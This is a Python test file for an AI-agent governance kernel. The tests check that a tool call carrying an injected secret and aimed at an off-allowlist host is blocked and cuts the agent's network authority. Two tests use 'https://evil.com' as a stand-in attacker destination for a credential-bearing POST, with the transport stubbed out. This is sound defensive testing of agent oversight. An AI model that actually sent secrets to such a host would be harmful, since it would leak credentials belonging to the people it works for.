"""secret_capability_misdirection (C2 class 3): the agent never sees raw secret values — they are
injected so tools can WIELD them — so the threat is directing a secret-BEARING call at an
UNAUTHORIZED destination. Each secret is bound to its authorized destination(s); a call wielding it
to an off-allowlist destination is BLOCKED (the leak) and FLOORS authority (the attempt is the
breach — a compromised credential is rotated, never recovered). Enforced kernel-side, so it holds on
ANY platform including open egress.
"""
# Author: Daniel Styles <me0wc0w73@gmail.com>
from __future__ import annotations

import pytest

from aurum.build_state import is_built
from aurum.integrations import GovernedHttpClient
from aurum.kernel import GovernanceKernel

pytestmark = pytest.mark.skipif(
    not is_built("PK", "EL", "AG", "CA", "BB"),
    reason="governance organs not all built",
)

_TOOLS = {"send": {"capability_class": "network", "action_class": "commit_outward",
                   "risk_tier": "consequential"}}
_BIND = {"DEMO_KEY": ["https://api.host"]}        # DEMO_KEY may authenticate ONLY api.host


def _client(kernel, base_url):
    return GovernedHttpClient(kernel, server_id="s", base_url=base_url, tool_classes=_TOOLS,
                              api_key="v", secret_ref="DEMO_KEY",
                              transport=lambda *a, **k: {"ok": True})


def test_secret_to_off_allowlist_destination_floors(tmp_path):
    k = GovernanceKernel(home=str(tmp_path), secret_destinations=_BIND)
    cc = "network"
    # a client wielding DEMO_KEY but pointed at the WRONG host — misdirection
    r = _client(k, "https://evil.com").call("send", "POST", "/x", body={"d": 1})
    assert r["allowed"] is False and r["rule_id"] == "gov:secret-misdirection"
    assert k.ag.authority(cc) == k.ag.kinetics()["floor"]      # floored — the attempt is a breach
    # the floor resolves to the five-class cause in the ledger (replayability invariant)
    floors = [e for e in k.el.query({"source_organ": "AG", "action_type": "TRUST_CHANGE"})
              if (e["payload"].get("cause") or {}).get("severity") == "governance"]
    assert any(f["payload"]["cause"]["severity_class"] == "secret_capability_misdirection"
               for f in floors)


def test_secret_to_authorized_destination_is_not_misdirection(tmp_path):
    k = GovernanceKernel(home=str(tmp_path), secret_destinations=_BIND)
    # the SAME secret to its AUTHORIZED host — not misdirection (it may still be AG-gated by band,
    # but it is never blocked or floored as a secret breach)
    r = _client(k, "https://api.host").call("send", "POST", "/submit", body={"d": 1})
    assert r["rule_id"] != "gov:secret-misdirection"
    assert k.ag.authority("network") != k.ag.kinetics()["floor"]   # not floored


def test_unbound_secret_is_not_enforced(tmp_path):
    # a secret with NO binding known (the broker hasn't recorded its destination) is not enforced
    # here — fail-open is wrong for secrets in general, but an UNKNOWN binding can't be checked, and
    # the action is still AG-gated. (The binding is the enforcement prerequisite; absence ≠ breach.)
    k = GovernanceKernel(home=str(tmp_path), secret_destinations={})
    r = _client(k, "https://evil.com").call("send", "POST", "/x", body={"d": 1})
    assert r["rule_id"] != "gov:secret-misdirection"           # no binding → no misdirection verdict
